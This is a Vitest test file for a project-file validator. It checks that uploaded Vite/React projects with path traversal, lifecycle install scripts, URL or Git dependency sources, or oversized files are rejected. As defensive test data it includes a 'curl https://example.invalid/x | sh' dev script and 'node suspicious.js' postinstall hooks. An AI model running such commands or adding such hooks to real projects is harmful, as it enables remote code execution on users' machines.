import { describe, expect, it } from 'vitest';
import { MAX_FILE_LENGTH, MAX_FILES, validateProjectFiles } from './project-validation';

const validFiles = [
  { path: 'package.json', content: '{"scripts":{"dev":"vite"}}' },
  { path: 'index.html', content: '<div id="root"></div>' },
  { path: 'src/main.tsx', content: 'import React from "react";' },
  { path: 'src/App.tsx', content: 'export default function App() { return null; }' },
  { path: 'src/styles.css', content: 'body { margin: 0; }' },
];

describe('validateProjectFiles', () => {
  it('accepts a minimal project with required root files', () => {
    expect(validateProjectFiles(validFiles)).toEqual(validFiles);
  });

  it('rejects missing required root files', () => {
    expect(validateProjectFiles([{ path: 'package.json', content: '{}' }, { path: 'index.html', content: '<div></div>' }, { path: 'src/App.tsx', content: 'export {}' }])).toBeNull();
  });

  it('rejects path traversal and absolute paths', () => {
    expect(validateProjectFiles([...validFiles, { path: 'src/../secret.ts', content: 'x' }])).toBeNull();
    expect(validateProjectFiles([...validFiles, { path: '/tmp/evil.ts', content: 'x' }])).toBeNull();
  });

  it('rejects backslash paths, empty path segments, and unsupported file locations', () => {
    expect(validateProjectFiles([...validFiles, { path: 'src\\\\evil.ts', content: 'x' }])).toBeNull();
    expect(validateProjectFiles([...validFiles, { path: 'src//nested.ts', content: 'x' }])).toBeNull();
    expect(validateProjectFiles([...validFiles, { path: 'src/./nested.ts', content: 'x' }])).toBeNull();
    expect(validateProjectFiles([...validFiles, { path: 'public/evil.js', content: 'x' }])).toBeNull();
  });

  it('rejects malformed package.json and automatic lifecycle scripts', () => {
    const withPackage = (packageContent: string) =>
      validFiles.map((file) => file.path === 'package.json' ? { ...file, content: packageContent } : file);

    expect(validateProjectFiles(withPackage('{invalid json'))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { postinstall: 'node suspicious.js' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { prepare: 'node setup.js' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { preprepare: 'node before.js' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { postprepare: 'node after.js' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { predev: 'node before-dev.js', dev: 'vite' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { build: 'vite build', postbuild: 'node after-build.js' } })))).toBeNull();
  });

  it('allows ordinary development scripts in package.json', () => {
    const files = validFiles.map((file) =>
      file.path === 'package.json'
        ? { ...file, content: JSON.stringify({ scripts: { dev: 'vite', build: 'tsc && vite build' } }) }
        : file
    );
    expect(validateProjectFiles(files)).toEqual(files);
  });

  it('rejects arbitrary shell commands and unsupported npm scripts', () => {
    const withPackage = (packageContent: string) =>
      validFiles.map((file) => file.path === 'package.json' ? { ...file, content: packageContent } : file);

    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 'curl https://example.invalid/x | sh' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 'vite && node suspicious.js' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { custom: 'node script.js' } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 123 } })))).toBeNull();
  });

  it('rejects duplicate paths', () => {
    expect(validateProjectFiles([...validFiles, { path: 'src/main.tsx', content: 'duplicate' }])).toBeNull();
  });

  it('rejects too many files', () => {
    const files = [...validFiles];
    while (files.length <= MAX_FILES) files.push({ path: `src/file${files.length}.ts`, content: 'x' });
    expect(validateProjectFiles(files)).toBeNull();
  });

  it('rejects a file over the per-file limit', () => {
    const oversized = validFiles.map((file, index) => index === 0 ? { ...file, content: 'x'.repeat(MAX_FILE_LENGTH + 1) } : file);
    expect(validateProjectFiles(oversized)).toBeNull();
  });

  it('rejects projects over the aggregate size limit', () => {
    const oversized = validFiles.map((file) => ({ ...file, content: 'x'.repeat(25000) }));
    expect(validateProjectFiles(oversized)).toBeNull();
  });

  it('rejects dependency sources that point to URLs, Git, local paths, or npm aliases', () => {
    const withPackage = (packageContent: string) =>
      validFiles.map((file) => file.path === 'package.json' ? { ...file, content: packageContent } : file);

    for (const version of [
      'https://example.invalid/pkg.tgz',
      'git+https://example.invalid/repo.git',
      'github:someone/suspicious-package',
      'file:../local-package',
      '../local-package',
      'npm:other-package@1.0.0',
    ]) {
      expect(validateProjectFiles(withPackage(JSON.stringify({ dependencies: { 'sample-package': version } })))).toBeNull();
    }
  });

  it('allows ordinary registry dependency versions', () => {
    const files = validFiles.map((file) =>
      file.path === 'package.json'
        ? { ...file, content: JSON.stringify({ dependencies: { react: '^19.0.0', 'react-dom': '^19.0.0' }, devDependencies: { vite: '^6.0.0' } }) }
        : file
    );
    expect(validateProjectFiles(files)).toEqual(files);
  });

  it('rejects malformed dependency sections and versions', () => {
    const withPackage = (packageContent: string) =>
      validFiles.map((file) => file.path === 'package.json' ? { ...file, content: packageContent } : file);
    expect(validateProjectFiles(withPackage(JSON.stringify({ dependencies: [] })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ dependencies: { react: 123 } })))).toBeNull();
    expect(validateProjectFiles(withPackage(JSON.stringify({ dependencies: { 'bad name': '^1.0.0' } })))).toBeNull();
  });

  it('rejects malformed values', () => {
    expect(validateProjectFiles(null)).toBeNull();
    expect(validateProjectFiles([null, ...validFiles])).toBeNull();
    expect(validateProjectFiles([{ path: 'package.json', content: 123 }, validFiles[1]])).toBeNull();
  });
});
